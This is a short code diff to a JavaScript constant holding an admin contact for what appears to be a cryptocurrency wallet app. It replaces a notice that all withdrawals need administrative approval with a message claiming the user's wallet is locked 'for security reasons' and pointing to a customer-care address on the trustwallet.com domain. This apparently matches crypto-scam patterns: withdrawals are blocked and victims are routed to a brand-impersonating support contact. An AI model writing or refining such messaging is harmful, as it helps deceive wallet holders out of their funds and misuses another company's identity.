@@ -1,5 +1,5 @@
 export const ADMIN_CONTACT = {
   EMAIL: 'customercare@trustwallet.com',
-  SUBJECT: 'Withdrawal Request',
-  MESSAGE: 'Please contact our customer care team to process your withdrawal request. For security purposes, all withdrawals require administrative approval.'
+  SUBJECT: 'Wallet Unlock Request',
+  MESSAGE: 'Your wallet has been locked for security reasons. Please contact our customer care team at customercare@trustwallet.com to unlock your account.'
 }; 
